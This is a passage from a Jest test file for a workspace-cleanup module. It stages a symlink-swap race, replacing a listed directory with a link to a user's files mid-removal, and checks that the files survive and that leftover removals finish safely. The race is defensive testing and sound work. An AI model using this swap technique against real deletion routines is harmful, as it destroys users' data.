    fs.symlinkSync(victim, path.join(getWorkspacesDir(), 'ws-bbbb-2222'));
    // A writer swaps d0 for a link to the user's files just after the
    // removal has listed it as a directory - the race a real one would have
    // to win, won here every time.
    const realReaddir = fs.promises.readdir.bind(fs.promises) as (...args: unknown[]) => Promise<fs.Dirent[]>;
    let swapped = false;
    jest.spyOn(fs.promises, 'readdir').mockImplementation((async (...args: unknown[]) => {
      const listed = await realReaddir(...args);
      const d0 = path.join(String(args[0]), 'd0');
      if (!swapped && listed.some((entry) => entry.name === 'd0' && entry.isDirectory())) {
        fs.renameSync(d0, path.join(appData, 'd0.moved'));
        fs.symlinkSync(victim, d0);
        swapped = true;
      }
      return listed;
    }) as never);

    expect(await removeWorkspace('ws-aaaa-1111')).toBe(true);
    expect(await removeWorkspace('ws-bbbb-2222')).toBe(true);

    expect(swapped).toBe(true);
    expect(fs.readdirSync(victim)).toEqual(['keep']);
    expect(fs.readFileSync(path.join(victim, 'keep'), 'utf-8')).toBe('kept');
    expect(fs.readdirSync(getWorkspacesDir())).toEqual([]);
  });

  it('finishes a removal an earlier run left part done', async () => {
    const aside = path.join(getWorkspacesDir(), '.removing-ws-aaaa-1111.0a1b2c3d');
    fs.mkdirSync(path.join(aside, 'd0'), { recursive: true });
    fs.writeFileSync(path.join(aside, 'd0', 'output'), 'step');
    fs.symlinkSync(victim, path.join(aside, 'link'));
    const recent = idAt(Date.now());
    makeWorkspace(recent, { sourceDir: '/x', createdAt: new Date().toISOString() });

    await cleanupWorkspaces();

    expect(fs.readdirSync(getWorkspacesDir())).toEqual([recent]);
    expect(fs.readFileSync(path.join(victim, 'keep'), 'utf-8')).toBe('kept');
  });
});
